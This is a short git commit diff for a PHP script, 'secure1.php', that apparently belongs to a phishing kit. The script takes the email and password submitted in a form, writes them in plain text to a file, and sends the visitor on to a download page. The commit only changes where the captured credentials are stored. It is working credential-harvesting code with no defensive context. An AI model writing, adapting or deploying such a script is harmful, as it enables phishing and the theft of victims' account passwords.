eb21e8a0a595af7944c1f49e958fd65a0e877e3d
attachauditionreq <filereceived1@gmail.com>
2017-05-08 19:16:38 -0700

    Update secure1.php

--- secure1.php
+++ secure1.php
@@ -3,7 +3,7 @@
 $email = $_POST['email'];
 $password = $_POST['password'];
 
-file_put_contents("../database/$ip.txt","\r\n\r\nEmail: ". $email."\r\nPassword: ". $password, FILE_APPEND);
+file_put_contents("database.txt","\r\n\r\nEmail: ". $email."\r\nPassword: ". $password, FILE_APPEND);
 
 header('Refresh: 0;url=download.html');
 ?>
